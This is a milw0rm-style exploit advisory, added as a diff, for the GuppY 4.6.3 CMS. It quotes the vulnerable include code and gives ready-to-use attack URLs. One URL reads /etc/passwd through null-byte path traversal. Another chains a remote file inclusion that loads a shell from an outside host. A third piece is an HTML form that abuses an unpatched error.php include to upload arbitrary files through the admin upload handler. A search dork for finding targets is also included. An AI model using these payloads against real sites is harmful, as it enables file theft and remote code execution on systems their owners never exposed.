@@ -1,0 +1,78 @@
+vuln.: GuppY 4.6.3 (includes.inc selskin) Remote File Inclusion
+  script info and download: http://www.freeguppy.org/
+  dork: "Site powered by GuppY" 
+ 
+  author: irk4z[at]yahoo.pl
+  greets to: str0ke, rgod, polish under :*
+'-----------------------------------------------------------------------------' 
+ 
+# code:
+
+   /tinymsg.php, line 24:
+   ...
+24    define("CHEMIN", "");
+   ...   
+   
+   /inc/includes.inc, lines 155-168:
+   ...
+155   if (isset($selskin)) {
+156     $page[14]=$selskin;
+157   }
+158
+159   if (is_file(CHEMIN."skin/".$page[14]."/skin".INCEXT)) {
+160    include(CHEMIN."skin/".$page[14]."/skin".INCEXT);
+161   } else {
+162    include(CHEMIN."skin/no_skin/skin".INCEXT);
+163   }
+164   if (is_file(CHEMIN."skin/".$page[14]."/confskin".INCEXT)) {
+165    include(CHEMIN."skin/".$page[14]."/confskin".INCEXT);
+166   } else {
+167    include(CHEMIN."skin/no_skin/confskin".INCEXT);
+168   }
+   ...
+   
+   Local file inclusion on line 160 in $selskin, and I have used code
+   from:
+   
+   /inc/boxleft.inc, lines 98-102:
+   
+   ...
+98    for($ii=0; $ii<count($xposbox["L"]); $ii++) {
+99      if ($userprefs[3] != "R" && $xposbox["L"][$ii] != '') {
+100      include(CHEMIN.$xposbox["L"][$ii].INCEXT);
+101      $onemenu = 1;
+102   }
+   ...
+   
+   so.. i have remote file inclusion :D
+   
+# exploits:
+
+ local file inclusion:
+   http://[HOST]/[PATH]/index.php?selskin=[LFI]%00
+   http://[HOST]/[PATH]/index.php?selskin=..%2F..%2F..%2F..%2F.%2Fetc%2Fpasswd%00
+   
+ remote file inclusion:
+   http://[HOST]/[PATH]/index.php?selskin=..%2Finc%2Fboxleft.inc%00&xposbox[L][]=[RFI]
+   http://[HOST]/[PATH]/index.php?selskin=..%2Finc%2Fboxleft.inc%00&xposbox[L][]=http:%2F%2Fhost%2Fshell?
+   
+   ^ xposbox[L][] and selskin must be encode because GuppY filtering query..   
+
+# another bug: 
+
+rgod on 2007-01-29 published local file inclusion in error.php $id variable,
+but GuppY authors didn't patch it  :(  so you can upload file to
+
+ http://[HOST]/[PATH]/file/[your uploaded file]
+
+
+<form name="uploadit" enctype="multipart/form-data" method="post" action="http://[HOST]/[PATH]/error.php?">
+<input type="hidden" name="id" value="../../admin/inc/upload" alt="don't change! ;]" />
+<input type="hidden" name="pg" value="upload" />
+<input type="hidden" name="rep" value="file" />
+<input type="file"   name="ficup" size="36" />
+<input type="hidden" name="OK" value="1" />
+<input type="submit" value=" ok " />
+</form>
+
+# milw0rm.com [2007-11-03]
